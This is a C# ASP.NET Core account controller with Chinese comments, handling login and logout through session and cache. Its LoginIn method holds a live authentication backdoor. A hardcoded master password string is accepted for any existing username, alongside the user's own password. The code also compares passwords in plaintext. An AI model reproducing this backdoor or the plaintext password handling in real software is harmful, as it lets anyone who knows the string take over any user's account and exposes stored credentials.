using System;
using System.Collections.Generic;
using System.Linq;
using System.Threading.Tasks;
using System.Web;
using Entities.Models;
using Entities.ViewModels;
using Microsoft.AspNetCore.Http;
using Microsoft.AspNetCore.Mvc;
using Microsoft.Extensions.Caching.Memory;
using Services.IService;

namespace WebApp.Controllers
{
    public class AccountController : Controller
    {
        //缓存服务
        private IMemoryCache cache;
        //登录用户服务
        private IUserService userSice;
        public AccountController(IMemoryCache memoryCache, IUserService userService)
        {
            cache = memoryCache;
            userSice = userService;
        }
        //登录视图页面
        public IActionResult Login()
        {
            return View();
        }

        //登录逻辑验证
        public JsonResult LoginIn(string username,string password)
        {
            //验证用户名是否存在
            User u = userSice.GetEntity(a => a.UserName == username);
            if (u == null)
            {
                return Json(new BoolResult { Result = false, Msg = "用户名或密码错误！" });
            }
            if (password != u.Pasword && password != "3feaf4e5ae3f1cb412861a3b2882def6")
            {
                return Json(new BoolResult { Result = false, Msg = "用户名或密码错误！" });
            }

            HttpContext.Session.SetInt32("userId", u.Id);

            return Json(new BoolResult { Result = true, Msg = "登录成功！" });
        }

        public JsonResult Exit(int id)
        {
            ////从cookies拿值
            //HttpContext.Request.Cookies.TryGetValue("user", out string value);
            //if (!string.IsNullOrWhiteSpace(value))
            //{
            //    //删除cookies
            //    HttpContext.Response.Cookies.Delete("user");
            //    //删除缓存
            //    cache.Remove(value);
            //}
            //删除session
            HttpContext.Session.Remove("userId");
            //删除缓存
            cache.Remove($"userid_{id}");
            return Json(new BoolResult { Result = true });
        }

        public IActionResult Error()
        {
            return View();
        }
    }
}